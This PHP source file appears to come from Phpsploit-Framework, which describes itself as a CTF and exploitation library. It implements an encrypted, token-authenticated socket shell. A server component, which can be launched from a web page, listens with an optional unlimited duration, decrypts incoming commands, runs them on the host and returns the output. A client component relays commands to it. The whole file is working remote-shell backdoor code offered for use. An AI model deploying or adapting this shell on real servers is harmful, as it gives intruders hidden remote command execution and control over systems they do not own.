<?php
/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 22-12-13
 * Time: 下午12:03
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Operate_SocketServerShell extends Class_Operate
{
    const EXCEPTION_MESSAGE_TOKEN_ERROR  = "token is error";
    const EXCEPTION_MESSAGE_CONNECT_QUIT = "connect is exit";
    const EXCEPTION_MESSAGE_CONNECT_EXIT = "connect service is exit";
    const EXCEPTION_BREAK                = 1;

    private static $_clientSocker       = null;
    private static $_serverSocket       = null;
    private static $_max_connect_number = 0;

    public static function start_client ( $ip , $port , $token , $encode_key , $encode_iv_base64 )
    {
        Class_Base_Response::outputln ( "" );
        try {
            self::$_clientSocker = Class_Base_Socket::create ();
            Class_Base_Socket::connect ( self::$_clientSocker , $ip , $port );
            while ( true ) {
                $_command = fgets ( STDIN );
                if ( ( is_string ( $_command ) ) && ( strlen ( $_command ) > 0 ) ) {
                    $_encode_iv = base64_decode ( $encode_iv_base64 );
                    $_output    = ( $token . chr ( 32 ) . $_command );
                    $_output    = Class_Base_Security::phpsploit_encode ( $_output , $encode_key , $_encode_iv );
                    Class_Base_Socket::write ( self::$_clientSocker , $_output , null );
                    $_exec_result = Class_Base_Socket::read ( self::$_clientSocker , ( 1024 * 1024 * 100 ) , PHP_BINARY_READ );
                    if ( ! empty( $_exec_result ) ) {
                        $_exec_result = Class_Base_Security::phpsploit_decode ( $_exec_result , $encode_key , $_encode_iv );
                        Class_Base_Response::outputln ( $_exec_result );
                    }
                    if ( str_replace ( "\n" , "" , str_replace ( "\r\n" , "" , $_command ) ) == "exit" ) {
                        break;
                    }
                }
            }
            Class_Base_Socket::close ( self::$_clientSocker );
        } catch ( \Exception $e ) {
            @Class_Base_Socket::close ( self::$_clientSocker );
            Class_Base_Response::outputln ( $e );
        }
        Class_Base_Response::outputln ( "\n" );
    }

    public static function start ( $ip , $port , $max_connect_number = 1 , $max_execute_time = 3600 , $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SERVER;
            if ( ! is_array ( $_SERVER ) ) {
                $_SERVER = array ();
            }
        }
        try {
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Start , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient manager connect : " . $_SERVER[ "REMOTE_ADDR" ] . ":" . $_SERVER[ "REMOTE_PORT" ] . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "Shell Server is Start" );
            }
            self::create_token ( $connect_domain_List_id );
            Class_Base_Socket::init ( $max_execute_time );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\n" . 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( 'The maximum effective listening time of the socket server has been set to ' . ( ( intval ( $max_execute_time ) === 0 ) ? 'unlimited duration. Please note that such behavior may be dangerous!' : ( $max_execute_time . ' seconds' ) ) );
            }
            self::$_max_connect_number = $max_connect_number;
            self::$_serverSocket       = Class_Base_Socket::create ();
            Class_Base_Socket::set_block ( self::$_serverSocket );
            Class_Base_Socket::bind ( self::$_serverSocket , $ip , $port );
            Class_Base_Socket::listen ( self::$_serverSocket , self::$_max_connect_number );
            do {
                $token      = self::get_token ();
                $decode_key = self::get_decode_key ();
                $decode_iv  = self::get_decode_iv ();
                self::check_browser_service_stop ();
                try {
                    $_socket     = Class_Base_Socket::accept ( self::$_serverSocket );
                    $_clientinfo = Class_Base_Socket::getpeername ( $_socket );
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nReceived socket connection from client : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) ) . "\n" , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "Received socket connection from client : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) );
                    }
                    while ( true ) {
                        self::check_browser_service_stop ();
                        $command = Class_Base_Socket::read ( $_socket , ( 1024 * 1024 * 100 ) , PHP_BINARY_READ );
                        if ( ! empty( $command ) ) {
                            $command      = str_replace ( "\n" , "" , str_replace ( "\r" , "" , $command ) );
                            $command      = Class_Base_Security::phpsploit_decode ( $command , $decode_key , $decode_iv );
                            $command      = str_replace ( "\n" , "" , str_replace ( "\r" , "" , $command ) );
                            $request_info = explode ( " " , $command );
                            if ( count ( $request_info ) < 2 ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_QUIT , self::EXCEPTION_BREAK );
                            }
                            $request_token = $request_info[ 0 ];
                            array_shift ( $request_info );
                            $command = implode ( " " , $request_info );
                            if ( $request_token != $token ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_TOKEN_ERROR , self::EXCEPTION_BREAK );
                            }
                            if ( $command == "quit" ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_QUIT , self::EXCEPTION_BREAK );
                            }
                            if ( $command == "exit" ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                            }
                            if ( $command == chr ( 3 ) ) {
                                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                            }
                            $_output        = Class_Base_Shell::command ( $command );
                            $_socket_output = self::array_split_to_string ( $_output );
                            $_socket_output = Class_Base_Security::phpsploit_encode ( $_socket_output , $decode_key , $decode_iv );
                            Class_Base_Socket::write ( $_socket , $_socket_output , null );
                            if ( ! is_cli () ) {
                                $_web_output = self::array_to_js_inner_html_string ( $_output );
                                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : " . "\n\n" . $_web_output ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                            } else {
                                $_cli_output = $_socket_output;
                                Class_Base_Response::outputln ( "client : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . " , command : " . $command . " , result : \n\n" . $_cli_output );
                            }
                        }
                        self::check_browser_service_stop ();
                    }
                } catch ( \Exception $e ) {
                    Class_Base_Socket::close ( $_socket );
                    if ( ! is_cli () ) {
                        Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nclient socket connect is close : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
                    } else {
                        Class_Base_Response::outputln ( "client socket connect is close : " . $_clientinfo[ "ip" ] . ":" . $_clientinfo[ "port" ] . " , time : " . date ( "Y-m-d H:i:s" , time () ) );
                    }
                    if ( $e->getMessage () == self::EXCEPTION_MESSAGE_CONNECT_EXIT ) {
                        throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
                    }
                }

            } while ( true );

        } catch ( \Exception $e ) {
            Class_Base_Socket::close ( self::$_serverSocket );
            if ( ! is_cli () ) {
                Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "\nShell Server is Stop , time : " . date ( "Y-m-d H:i:s" , time () ) . "\n" ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
            } else {
                Class_Base_Response::outputln ( "\nShell Server is Stop , time : " . date ( "Y-m-d H:i:s" , time () ) );
            }
        }
    }

    public static function array_to_js_inner_html_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function array_split_to_string ( $array = array () )
    {
        return implode ( "\n" , $array ) . "\n";
    }

    public static function check_browser_service_stop ()
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
            Class_Base_Response::outputln ( "" );
            flush ();
            if ( connection_aborted () ) {
                throw new \Exception( self::EXCEPTION_MESSAGE_CONNECT_EXIT , self::EXCEPTION_BREAK );
            }
        }
    }

    public static function create_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ]            = md5 ( time () . rand ( 10000000 , 99999999 ) );
        $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ]       = md5 ( time () . rand ( 10000000 , 99999999 ) );
        $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] = base64_encode ( openssl_random_pseudo_bytes ( openssl_cipher_iv_length ( "AES-256-CBC" ) ) );
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ] . " , decode key : " . $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ] . " , decode iv ( base64 ) : " . str_replace ( ' ' , '+' , $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "token : " . $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ] . " , decode key : " . $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ] . " , decode iv ( base64 ) : " . $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] . "\n" );
        }
    }

    public static function get_token ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ] ) ) {
            return null;
        }
        return $_SESSION[ "SOCKET_SERVER_SHELL_TOKEN" ];
    }

    public static function get_decode_key ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ] ) ) {
            return null;
        }
        return $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_KEY" ];
    }

    public static function get_decode_iv ()
    {
        if ( is_cli () ) {
            global $_SESSION;
            if ( ! is_array ( $_SESSION ) ) {
                $_SESSION = array ();
            }
        }
        if ( empty( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] ) ) {
            return null;
        }
        return base64_decode ( $_SESSION[ "SOCKET_SERVER_SHELL_ENCODE_IV_BASE64" ] );
    }

    public static function out_token ( $connect_domain_List_id = "connect_domain_list_id" )
    {
        if ( ! is_cli () ) {
            while ( ob_get_level () ) {
                ob_end_clean ();
            }
        }
        if ( ! is_cli () ) {
            Class_Base_Response::output_textarea_inner_html ( $connect_domain_List_id , ( "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) . ( " , decode key : " . self::get_decode_key () ) . ( " , decode iv ( base64 encoding ) : " . base64_encode ( self::get_decode_iv () ) ) ) , Class_Base_Response::FLAG_JS_CONTENT_INNER_HTML_APPEND );
        } else {
            Class_Base_Response::outputln ( "\n" . "socket connect authentication token : " . ( empty( self::get_token () ) ? "" : self::get_token () ) . "\n" );
        }
    }

}